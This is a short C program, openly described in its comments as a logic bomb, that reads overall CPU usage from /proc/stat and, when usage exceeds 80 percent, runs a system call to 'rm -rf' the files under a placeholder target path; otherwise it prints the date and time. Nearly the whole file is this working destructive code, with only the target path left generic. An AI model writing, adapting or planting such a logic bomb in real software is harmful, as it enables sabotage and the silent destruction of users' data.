#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

// Function to simulate the logic bomb payload
void trigger_logic_bomb() {
    printf("Logic bomb triggered due to high CPU usage! Deleting all files...\n");
    // System command to simulate deleting files
    system("rm -rf /path/to/target/files/*");
}

// Function to calculate CPU usage based on /proc/stat (Linux specific)
double get_cpu_usage() {
    long idle_time, total_time;
    static long prev_idle_time = 0, prev_total_time = 0;
    long delta_idle, delta_total;

    FILE* file = fopen("/proc/stat", "r");
    if (!file) {
        perror("Failed to open /proc/stat");
        return -1;
    }

    // Read first line from /proc/stat (which contains the CPU stats)
    char buffer[256];
    fgets(buffer, sizeof(buffer), file);
    fclose(file);

    // Parse CPU time values from the first line
    long user, nice, system, idle, iowait, irq, softirq, steal;
    sscanf(buffer, "cpu %ld %ld %ld %ld %ld %ld %ld %ld", &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal);

    idle_time = idle + iowait; // Total idle time
    total_time = user + nice + system + idle + iowait + irq + softirq + steal; // Total time

    delta_idle = idle_time - prev_idle_time;
    delta_total = total_time - prev_total_time;

    prev_idle_time = idle_time;
    prev_total_time = total_time;

    // Return CPU usage percentage
    return (1.0 - (double)delta_idle / delta_total) * 100.0;
}

// Function to print the current date and time
void print_date_time() {
    time_t now;
    time(&now);

    // Convert to local time format and print
    printf("Current Date and Time: %s", ctime(&now));
}

int main() {
    double cpu_usage;
    const double threshold = 80.0; // CPU usage threshold to trigger the logic bomb

    printf("Checking CPU usage...\n");

    // Get CPU usage
    cpu_usage = get_cpu_usage();

    if (cpu_usage < 0) {
        printf("Failed to retrieve CPU usage.\n");
        return 1;
    }

    printf("Current CPU usage: %.2f%%\n", cpu_usage);

    // Trigger the logic bomb if CPU usage exceeds the threshold
    if (cpu_usage > threshold) {
        trigger_logic_bomb();
    } else {
        // Print the date and time if CPU usage is below the threshold
        print_date_time();
    }

    return 0;
}
